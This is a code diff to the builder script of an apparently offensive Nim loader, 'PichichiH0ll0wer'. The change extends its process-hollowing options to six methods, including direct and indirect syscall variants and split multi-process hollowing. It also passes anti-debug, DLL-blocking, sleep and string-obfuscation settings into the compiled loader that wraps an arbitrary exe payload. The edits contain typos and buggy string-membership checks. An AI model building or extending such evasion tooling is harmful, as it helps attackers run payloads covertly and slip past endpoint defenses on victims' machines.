@@ -63,7 +63,7 @@ var outDllExportName: string
 var isBlockDlls: bool
 var isSplit: bool
 var sleepSeconds: string
-var antiDebugAction: string
+var antiDebugg: string
 var isDebug: bool
 
 # Define compiler args
@@ -74,7 +74,7 @@ var compileDllPath = " Loader/dll.nim"                  # for source dll
 var compileOutExe = " -o:PichichiH0ll0wer.exe"          # for compiled exe
 var compileOutDll = " -o:PichichiH0ll0wer.dll"          # for compiled dll
 var compileFlags = " --cpu=amd64"                       # for windows 64 bit
-compileFlags.add " -d:release -d:strip --opt:none"      # for minimal size   # --opt:size causing runtime errors
+compileFlags.add " -d:release -d:strip --opt:none"      # for minimal size   # --opt:size casuing runtime erros here!
 compileFlags.add " --passL:-Wl,--dynamicbase"           # for relocation table (needed for loaders)
 compileFlags.add " --benchmarkVM:on"                    # for NimProtect key randomization
 
@@ -85,11 +85,13 @@ when isMainModule:
         help(pichichiBanner)
         arg("exe-file", help="Exe file to load")
         arg("injection-method", help="""Injection method
-        
+
         1 - Simple hollowing
-        2 - Syscalls hollowing
-        3 - Splitted hollowing using multiple processes
-        4 - Splitted hollowing using multiple processes and syscalls
+        2 - Direct syscalls hollowing
+        3 - Indirect syscalls hollowing
+        4 - Splitted hollowing using multiple processes
+        5 - Splitted hollowing using multiple processes and direct syscalls
+        6 - Splitted hollowing using multiple processes and indirect syscalls
         """)
         option("-s", "--sponsor", help="Sponsor path to hollow (default: self hollowing)")
         option("-a", "--args", help="Command line arguments to append to the hollowed process")
@@ -115,7 +117,7 @@ when isMainModule:
         isBlockDlls = opts.block
         isSplit = opts.split
         sleepSeconds = opts.sleep
-        antiDebugAction = opts.anti_debug
+        antiDebugg = opts.anti_debug
         isDebug = opts.debug
     except ShortCircuit as err:
         if err.flag == "argparse_help":
@@ -139,8 +141,8 @@ when isMainModule:
         quit(1)
 
     # Validate params
-    if injectionMethod in ["3", "4"] and outFormat == "dll":
-        echo "[-] Injection method isn't compatible with dll format"
+    if injectionMethod in ["4", "5", "6"] and outFormat == "dll":
+        echo "[-] Splitted hollowing method isn't compatible with dll format"
         quit(1)
 
     # Compress & encode exe payload
@@ -163,7 +165,7 @@ var sponsorPath* = {sponsorPath}
 var sponsorParams* = protectString(r" {sponsorParams}")
 var dllExportName* = protectString("{outDllExportName}") 
 var isBlockDlls* = {isBlockDlls}
-var antiDebugAction* = protectString("{antiDebugAction}")
+var antiDebugAction* = protectString("{antiDebugg}")
 var sleepSeconds* = {sleepSeconds}
     """
     writeFile(paramsPath, paramsToHollower)
@@ -171,16 +173,20 @@ var sleepSeconds* = {sleepSeconds}
     # Choose injection method
     if injectionMethod == "1":
         compileFlags.add(" -d:hollow1")
-    elif injectionMethod == "2":
+    elif injectionMethod in "2":
         compileFlags.add(" -d:hollow2")
     elif injectionMethod == "3":
         compileFlags.add(" -d:hollow3")
     elif injectionMethod == "4":
         compileFlags.add(" -d:hollow4")
+    elif injectionMethod == "5":
+        compileFlags.add(" -d:hollow5")
+    elif injectionMethod in "6":
+        compileFlags.add(" -d:hollow6")
     else:
         echo "[-] Injection method doesn't exist :("
         quit(1)
-
+        
     # Change to debug if needed
     if isDebug:
         compileFlags = compileFlags.replace("-d:release ", "")
@@ -208,7 +214,7 @@ proc {outDllExportName}(): void {{.stdcall, exportc, dynlib.}} =
     var res = execCmdEx(compileCmd, options={poStdErrToStdOut})
     if res[1] == 0:
         echo "[+] Compiled successfully"
-        if injectionMethod in ["3", "4"]:
+        if injectionMethod in ["4", "5", "6"]:
             echo "[i] Run the hollower with -M argument"
     else:
         echo "[-] Error compiling. compilation output:"
